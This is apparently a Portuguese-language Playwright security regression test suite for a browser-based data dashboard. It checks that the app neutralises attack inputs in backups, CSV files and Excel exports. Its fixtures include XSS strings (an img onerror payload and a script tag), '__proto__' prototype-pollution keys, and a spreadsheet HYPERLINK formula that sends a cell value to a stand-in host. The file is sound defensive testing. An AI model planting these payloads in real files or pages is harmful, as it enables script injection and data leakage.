"""Regressao de seguranca (parecer docs/04_seguranca/revisao-etapa1.md: M-1, M-2, M-3, M-4, B-1, B-6).
Escrita so a partir da especificacao e do parecer; usa o app so pelo navegador."""
import json, re, html, zipfile
import pytest
from conftest import URL
from test_etapa1 import (carregar, backup, abrir_config, abrir_painel, gerar_excel, abrir_xlsx,
                         codigos_no_backup)


def restaurar(page, texto, modo="Substituir"):
    abrir_config(page)
    with page.expect_file_chooser() as fc:
        page.get_by_role("button", name="Restaurar backup").click()
    fc.value.set_files([{"name": "historico_RaioX_2026-11-25.json", "mimeType": "application/json",
                         "buffer": texto.encode()}])
    page.wait_for_timeout(500)
    btn = page.get_by_role("button", name=modo, exact=True)
    if btn.count():
        btn.first.click()
    page.wait_for_timeout(800)


def csv_tmp(tmp_path, nome, texto):
    p = tmp_path / nome
    p.write_text(texto, encoding="utf-8")
    return p


def erros_pagina(page):
    erros = []
    page.on("pageerror", lambda e: erros.append(str(e)))
    return erros


# ---------- M-1 ----------
def test_SEG_M1_backup_com_formula_e_hyperlink_nao_vira_celula_ativa(page, tmp_path):
    carregar(page, "vendas.csv")
    _, b = backup(page)
    d = json.loads(b)
    d["registros"][0]["v"]["Cliente"] = {"formula": 'HYPERLINK("http://exemplo.invalido/?"&A2,"ver")'}
    d["registros"][1]["v"]["Cliente"] = {"text": "x", "hyperlink": "http://exemplo.invalido/"}
    d["registros"][2]["v"]["Região"] = {"formula": "1+1"}
    page.get_by_role("button", name="Apagar todos os dados").click()
    page.get_by_role("button", name="Apagar", exact=True).click()
    page.wait_for_timeout(500)
    restaurar(page, json.dumps(d))
    dl = gerar_excel(page)
    wb = abrir_xlsx(dl, tmp_path)
    for ws in wb.worksheets:
        for row in ws.iter_rows():
            for c in row:
                assert c.data_type != "f", f"formula em {ws.title}!{c.coordinate}"
                assert c.hyperlink is None, f"hyperlink em {ws.title}!{c.coordinate}"
    with zipfile.ZipFile(tmp_path / dl.suggested_filename) as z:
        for n in z.namelist():
            if n.startswith("xl/worksheets/") and n.endswith(".xml"):
                x = z.read(n).decode("utf-8", "ignore")
                assert not re.search(r"<f[ >/]", x), f"<f> em {n}"
                assert "<hyperlink" not in x, f"hyperlink em {n}"
                assert "HYPERLINK(" not in x.upper()


# ---------- M-3 ----------
@pytest.mark.parametrize("ruim", [
    "isto nao e json {{{",
    json.dumps({"app": "raiox", "formato": 1, "registros": [{"conjunto": "vendas", "codigo": "X1", "v": {}}, None]}),
    json.dumps({"app": "raiox", "formato": 1, "registros": [{"conjunto": "vendas", "v": {"a": "b"}}]}),
    json.dumps({"app": "raiox", "formato": 1, "registros": [{"conjunto": "vendas", "codigo": "X1", "v": "texto"}]}),
    json.dumps({"app": "raiox", "formato": 1, "registros": [], "conjs": {"vendas": {"campos": "nao-lista"}}}),
    json.dumps({"app": "raiox", "formato": 1, "registros": [], "fmts": {"K": {"conjunto": "v", "cols": 5}}}),
])
def test_SEG_M3_restaurar_backup_invalido_mantem_dados(page, ruim):
    erros = erros_pagina(page)
    carregar(page, "vendas.csv")
    _, antes = backup(page)
    n = len(set(codigos_no_backup(antes)))
    assert n > 0
    restaurar(page, ruim)
    corpo = page.inner_text("body")
    assert re.search(r"não é um backup|inválid|erro|não foi possível", corpo, re.I), \
        "deveria mostrar mensagem de erro (parecer: 'Esse arquivo não é um backup do Raio X')"
    _, depois = backup(page)
    assert len(set(codigos_no_backup(depois))) == n, "dados anteriores devem continuar"
    # o app continua abrindo
    abrir_painel(page)
    abrir_config(page)
    assert erros == []


# ---------- M-4 ----------
def test_SEG_M4_nomes_de_campo_e_arquivo_perigosos_importam(page, tmp_path):
    erros = erros_pagina(page)
    p = csv_tmp(tmp_path, "__proto__.csv",
                "__proto__;Codigo;constructor;toString\nvalorP1;K001;valorC1;valorT1\nvalorP2;K002;valorC2;valorT2\n")
    carregar(page, p)
    page.wait_for_timeout(500)
    _, b = backup(page)
    for v in ["valorP1", "valorC1", "valorT1", "valorP2", "K001", "K002"]:
        assert v in b, f"{v} sumiu do backup"
    assert erros == []
    abrir_painel(page)
    assert "K001" in page.inner_text("body") or "Registros" in page.inner_text("body")


def test_SEG_M4_backup_com_proto_nao_polui_object_prototype(page):
    erros = erros_pagina(page)
    carregar(page, "vendas.csv")
    _, b = backup(page)
    suja = b.replace('"cfg":{', '"cfg":{"__proto__":{"polluted":1},', 1)
    suja = suja.replace('"conjs":{', '"conjs":{"__proto__":{"polluted":1},', 1)
    suja = suja.replace('"fmts":{', '"fmts":{"__proto__":{"polluted":1},', 1)
    suja = suja.replace('"app":"raiox"', '"app":"raiox","__proto__":{"polluted":1}', 1)
    restaurar(page, suja)
    assert page.evaluate("({}).polluted === undefined")
    # os dados do backup continuam acessiveis
    _, depois = backup(page)
    assert len(set(codigos_no_backup(depois))) == len(set(codigos_no_backup(b)))
    assert erros == []


# ---------- B-1 / CA-100 ----------
def test_SEG_B1_CA100_html_e_script_viram_texto(page, tmp_path):
    dialogos = []
    page.on("dialog", lambda d: (dialogos.append(d.message), d.dismiss()))
    img = "<img src=x onerror=window.__xss=1>"
    scr = "<script>window.__xss=1</script>"
    p = csv_tmp(tmp_path, f"{img}.csv", f"Código;Cliente;{scr}\nV00001;{img};{scr}\nV00002;Normal;{img}\n")
    carregar(page, p)
    abrir_painel(page)
    page.wait_for_timeout(600)
    corpo = page.inner_text("body")
    assert img in corpo
    assert page.evaluate("window.__xss === undefined")
    assert page.locator("img[src=x]").count() == 0
    assert dialogos == []
    abrir_config(page)
    page.wait_for_timeout(300)
    assert page.evaluate("window.__xss === undefined")
    assert page.locator("img[src=x]").count() == 0


# ---------- B-6 ----------
def test_SEG_B6_rodape_do_excel_mostra_e_comercial_literal(page, tmp_path):
    carregar(page, "vendas.csv")
    abrir_config(page)
    page.get_by_label("Cliente", exact=True).fill("A & B")
    page.wait_for_timeout(400)
    dl = gerar_excel(page)
    destino = tmp_path / dl.suggested_filename
    dl.save_as(str(destino))
    achou = False
    with zipfile.ZipFile(destino) as z:
        for n in z.namelist():
            if n.startswith("xl/worksheets/") and n.endswith(".xml"):
                x = z.read(n).decode("utf-8", "ignore")
                for m in re.findall(r"<oddFooter>(.*?)</oddFooter>", x, re.S):
                    t = html.unescape(m)
                    if "A" in t and "B" in t and re.search(r"A &+ B", t):
                        achou = True
                        # no codigo de cabecalho do Excel, '&&' e o '&' literal; '& B' sozinho seria codigo
                        assert "A && B" in t, f"'&' nao escapado no rodape: {t!r}"
    assert achou, "rodape com 'A & B' nao encontrado"


# ---------- M-2 (parte do app) ----------
def test_SEG_M2_service_worker_nao_apaga_cache_de_outro_app(page):
    """Simula 'versao nova': desregistra o SW e cria caches velhos; ao reinstalar, o activate roda de novo.
    Cache 'raiox-*' antigo pode sumir; o de outro app deve ficar."""
    page.evaluate("navigator.serviceWorker.ready.then(()=>1)")
    page.evaluate("""async()=>{
      for (const r of await navigator.serviceWorker.getRegistrations()) await r.unregister();
      await caches.open('outro-app-v1'); await caches.open('raiox-v0-antigo');}""")
    page.reload()
    page.wait_for_function("navigator.serviceWorker.getRegistration().then(r=>!!(r&&r.active))")
    page.wait_for_timeout(1500)
    nomes = page.evaluate("caches.keys()")
    if "raiox-v0-antigo" in nomes:
        pytest.skip(f"activate nao rodou neste ambiente (caches: {nomes}); nao da para simular versao nova")
    assert "outro-app-v1" in nomes, f"cache de outro app apagado pelo SW: {nomes}"


# ---------- Etapa 2: B-1 a B-4 (parecer docs/04_seguranca/revisao-etapa2.md) ----------
def _acomp_do_storage(page):
    return page.evaluate("JSON.parse(localStorage.getItem('raiox_acomp')||'{}')")


def test_SEG2_B1_backup_com_ids_repetidos_nao_multiplica_blocos(page):
    carregar(page, "vendas.csv")
    _, b = backup(page)
    d = json.loads(b)
    c = next(iter(d["conjs"]))
    d["acomp"] = {c: ["total"] * 500}
    restaurar(page, json.dumps(d))
    abrir_painel(page)
    assert page.get_by_role("heading", name="Total de registros", exact=True).count() == 1
    assert _acomp_do_storage(page)[c] == ["total"]


def test_SEG2_B1_backup_com_ids_enormes_ou_chaves_demais_e_recusado(page):
    carregar(page, "vendas.csv")
    _, b = backup(page)
    d = json.loads(b)
    c = next(iter(d["conjs"]))
    d["acomp"] = {c: ["x" * 5000]}
    restaurar(page, json.dumps(d), modo="Juntar")
    assert c not in _acomp_do_storage(page) or all(len(i) <= 1000 for i in _acomp_do_storage(page)[c])
    d["acomp"] = {f"k{i}": ["total"] for i in range(2000)}
    restaurar(page, json.dumps(d), modo="Juntar")
    assert len(_acomp_do_storage(page)) <= 200


def test_SEG2_B1_localstorage_adulterado_tambem_e_limpo(page):
    carregar(page, "vendas.csv")
    c = page.evaluate("Object.keys(JSON.parse(localStorage.getItem('raiox_conj')))[0]")
    page.evaluate("c => localStorage.setItem('raiox_acomp', JSON.stringify({[c]: Array(500).fill('total')}))", c)
    page.reload(); page.wait_for_timeout(1200)
    abrir_painel(page)
    assert page.get_by_role("heading", name="Total de registros", exact=True).count() == 1


def test_SEG2_B2_digitar_na_busca_nao_recalcula_catalogo_inteiro(page, tmp_path):
    cols = [f"N{i}" for i in range(30)] + [f"C{i}" for i in range(30)]
    linhas = ["Codigo," + ",".join(cols)]
    for r in range(1500):
        linhas.append(f"R{r}," + ",".join([str((r * 7 + i) % 97) for i in range(30)] + [f"v{(r + i) % 12}" for i in range(30)]))
    p = csv_tmp(tmp_path, "grande.csv", "\n".join(linhas))
    page.locator("input[type=file]").first.set_input_files([str(p)])
    page.wait_for_timeout(2500)
    from test_etapa1 import mapear_se_preciso
    mapear_se_preciso(page)
    page.evaluate("""() => { const c = Object.keys(JSON.parse(localStorage.getItem('raiox_conj')))[0];
        localStorage.setItem('raiox_acomp', JSON.stringify({[c]: ['total']})); }""")
    page.reload(); page.wait_for_timeout(2500)
    abrir_painel(page)
    ms = page.evaluate("""() => { const q = document.querySelector('#fQ'); const t0 = performance.now();
        for (let i = 0; i < 5; i++) { q.value = 'v' + i; q.dispatchEvent(new Event('input')); }
        return (performance.now() - t0) / 5; }""")
    assert ms < 60, f"cada tecla na busca levou {ms:.0f} ms"


def test_SEG2_B3_celula_da_aba_como_ler_cabe_no_limite_do_excel(page, tmp_path):
    carregar(page, "vendas.csv")
    abrir_painel(page)
    page.evaluate("""() => { const q = document.querySelector('#fQ'); q.value = 'a'.repeat(40000); q.dispatchEvent(new Event('input')); }""")
    c = page.evaluate("Object.keys(JSON.parse(localStorage.getItem('raiox_conj')))[0]")
    page.evaluate("c => localStorage.setItem('raiox_acomp', JSON.stringify({[c]: ['total']}))", c)
    page.reload(); page.wait_for_timeout(1200)
    abrir_painel(page)
    page.evaluate("""() => { const q = document.querySelector('#fQ'); q.value = 'a'.repeat(40000); q.dispatchEvent(new Event('input')); }""")
    wb = abrir_xlsx(gerar_excel(page), tmp_path)
    for ws in wb.worksheets:
        for row in ws.iter_rows():
            for cel in row:
                if isinstance(cel.value, str):
                    assert len(cel.value) <= 32767, f"{ws.title}!{cel.coordinate} com {len(cel.value)} caracteres"


def test_SEG2_B4_render_nao_sombreia_o_esc_de_html():
    import pathlib
    src = (pathlib.Path(__file__).resolve().parent.parent / "src" / "app.js").read_text(encoding="utf-8")
    trecho = src[src.index("function render()"):src.index("function render()") + 6000]
    assert "const esc =" not in trecho


# ---------- Etapa 3: M-1, M-2, B-1 a B-4 (parecer docs/04_seguranca/revisao-etapa3.md) ----------
NOMES12 = ["alfa", "bravo", "charlie", "delta", "eco", "foxtrote", "golfe", "hotel", "india", "julieta", "kilo", "lima"]


def _csv_regioes(tmp_path, cab="Código;Data;Região;Valor", nomes=NOMES12, extra=""):
    linhas = [cab]
    for i in range(36):
        linhas.append(f"V{i:04d};{(i % 28) + 1:02d}/03/2026;{nomes[i % len(nomes)]};{10 + i},50")
    return csv_tmp(tmp_path, "regioes.csv", "\n".join(linhas) + extra)


def _carrega_csv(page, p):
    from test_etapa1 import mapear_se_preciso, fechar_acompanhar
    page.locator("input[type=file]").first.set_input_files([str(p)])
    page.wait_for_timeout(1200)
    mapear_se_preciso(page)
    fechar_acompanhar(page)


def _pedir(page, frase):
    campo = page.get_by_label("Peça um indicador", exact=True)
    campo.fill(frase)
    campo.press("Enter")
    page.wait_for_timeout(500)


def _conj(page):
    return page.evaluate("Object.keys(JSON.parse(localStorage.getItem('raiox_conj')))[0]")


def test_SEG3_M1_pedido_com_filtros_demais_nao_salva_null_nem_quebra_painel(page, tmp_path):
    erros = erros_pagina(page)
    _carrega_csv(page, _csv_regioes(tmp_path))
    _pedir(page, " ".join(NOMES12))
    page.get_by_role("button", name="Sim", exact=True).click()
    page.wait_for_timeout(500)
    meus = page.evaluate("JSON.parse(localStorage.getItem('raiox_meus')||'{}')")
    assert all(x is not None for l in meus.values() for x in l)
    assert not erros, erros
    page.reload(); page.wait_for_timeout(1200)
    assert not erros, erros


def test_SEG3_M1_item_invalido_no_localstorage_descarta_so_o_item(page):
    carregar(page, "vendas.csv")
    c = _conj(page)
    ok = {"medida": "soma", "campo": "Valor", "agrupar": None, "filtros": [], "periodo": None}
    page.evaluate("([c,ok]) => localStorage.setItem('raiox_meus', JSON.stringify({[c]: [ok, null, {medida:'xx'}]}))", [c, ok])
    page.reload(); page.wait_for_timeout(1200)
    page.evaluate("() => document.querySelector('#toast') && 0")
    # um novo pedido valido deve somar ao item bom, sem apagar
    _pedir(page, "soma de valor por região")
    page.get_by_role("button", name="Sim", exact=True).click()
    page.wait_for_timeout(500)
    meus = page.evaluate("JSON.parse(localStorage.getItem('raiox_meus')||'{}')")
    assert len(meus[c]) == 2 and meus[c][0]["campo"] == "Valor"


def test_SEG3_M2_201o_sinonimo_e_recusado_e_os_200_continuam(page):
    carregar(page, "vendas.csv")
    page.evaluate("() => localStorage.setItem('raiox_sin', JSON.stringify(Object.fromEntries(Array.from({length:200},(_, i)=>['ap'+i,'Valor']))))")
    page.reload(); page.wait_for_timeout(1200)
    abrir_config(page)
    page.locator("#sinAp").fill("novoapelido")
    page.locator("#sinSig").select_option(index=1)
    page.locator("#sinAdd").click()
    page.wait_for_timeout(300)
    assert page.evaluate("Object.keys(JSON.parse(localStorage.getItem('raiox_sin'))).length") == 200
    assert "200" in page.locator("#toast").inner_text()


def test_SEG3_M2_51o_indicador_e_recusado_e_os_50_continuam(page):
    carregar(page, "vendas.csv")
    c = _conj(page)
    l = [{"medida": "soma", "campo": "Valor", "agrupar": None, "filtros": [], "periodo": {"tipo": "ano", "ano": 1950 + i}} for i in range(50)]
    page.evaluate("([c,l]) => localStorage.setItem('raiox_meus', JSON.stringify({[c]: l}))", [c, l])
    page.reload(); page.wait_for_timeout(1200)
    _pedir(page, "soma de valor por região")
    page.get_by_role("button", name="Sim", exact=True).click()
    page.wait_for_timeout(500)
    meus = page.evaluate("JSON.parse(localStorage.getItem('raiox_meus')||'{}')")
    assert len(meus[c]) == 50
    assert "50" in page.locator("#toast").inner_text()


def test_SEG3_M2_somar_backup_que_estoura_o_limite_nao_apaga_a_lista(page):
    carregar(page, "vendas.csv")
    page.evaluate("() => localStorage.setItem('raiox_sin', JSON.stringify(Object.fromEntries(Array.from({length:150},(_, i)=>['ap'+i,'Valor']))))")
    _, b = backup(page)
    d = json.loads(b)
    d["sin"] = {f"bk{i}": "Valor" for i in range(150)}
    restaurar(page, json.dumps(d), modo="Somar")
    n = page.evaluate("Object.keys(JSON.parse(localStorage.getItem('raiox_sin')||'{}')).length")
    assert 150 <= n <= 200


def test_SEG3_B1_motor_com_muitos_valores_e_frase_longa_nao_trava(page, tmp_path):
    import random
    rnd = random.Random(7)
    L = "abcd"
    cab = ["Código", "Data", "Valor"] + [f"Cat{i}" for i in range(20)]
    linhas = [";".join(cab)]
    for r in range(500):
        linhas.append(";".join([f"V{r:04d}", "05/03/2026", "10,00"] + ["".join(rnd.choice(L) for _ in range(40)) for _ in range(20)]))
    _carrega_csv(page, csv_tmp(tmp_path, "pesado.csv", "\n".join(linhas)))
    frase = " ".join("".join(rnd.choice(L) for _ in range(4)) for _ in range(60))
    ms = page.evaluate("([f]) => { const t = performance.now(); window.__entender(f, 'pesado'); return performance.now() - t; }", [frase])
    assert ms < 3000, f"motor levou {ms:.0f} ms"


def test_SEG3_B2_campo_chamado_constructor_nao_derruba_o_pedido(page, tmp_path):
    erros = erros_pagina(page)
    cab = "Código;Data;constructor;toString;Valor"
    linhas = [cab] + [f"V{i:04d};05/03/2026;{'x' + str(i)};{'y' + str(i % 3)};{10 + i},00" for i in range(30)]
    _carrega_csv(page, csv_tmp(tmp_path, "proto.csv", "\n".join(linhas)))
    for f in ["constructor x1", "soma de valor por toString", "valueOf hasOwnProperty"]:
        r = page.evaluate("([f]) => window.__entender(f, 'proto')", [f])
        assert isinstance(r, dict)
    _pedir(page, "constructor x1")
    assert not erros, erros


def test_SEG3_B3_filtro_com_caractere_de_controle_no_nome_aplica_o_valor_escolhido(page, tmp_path):
    cab = "Código;Data;Reg\u0001ião;Valor"
    p = _csv_regioes(tmp_path, cab=cab, nomes=["Norte", "Sul", "Leste"])
    _carrega_csv(page, p)
    _pedir(page, "soma de valor")
    page.get_by_role("button", name="Não", exact=True).click()
    page.get_by_role("button", name="Filtro", exact=True).click()
    page.locator("#pedBox select").select_option(label="Sul")
    page.get_by_role("button", name="Aplicar", exact=True).click()
    page.wait_for_timeout(400)
    txt = page.get_by_text("Entendi assim:").first.inner_text()
    assert "Sul" in txt


def test_SEG3_B4_gancho_entender_corta_a_frase_em_300_caracteres(page):
    carregar(page, "vendas.csv")
    frase = "x" * 299 + " " + "soma de valor " * 20
    r = page.evaluate("([f]) => window.__entender(f, 'vendas')", [frase])
    assert r["medida"] is None
    longa = "palavra " * 20000
    ms = page.evaluate("([f]) => { const t = performance.now(); window.__entender(f, 'vendas'); return performance.now() - t; }", [longa])
    assert ms < 1500
    assert sum(len(t) for t in r["naoEntendi"]) <= 400
